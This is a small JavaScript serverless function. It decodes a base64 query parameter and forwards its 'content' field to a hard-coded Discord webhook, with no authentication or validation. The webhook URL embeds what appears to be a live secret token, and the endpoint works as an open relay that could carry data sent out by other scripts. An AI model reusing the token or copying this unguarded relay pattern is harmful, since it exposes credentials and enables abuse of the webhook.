module.exports = (req, res) => {
  const { content } = JSON.parse(atob(new URL(req.url, `http://${req.headers.host}`).searchParams.get("data")));
  fetch('https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content }) });
  res.end("ok")
}
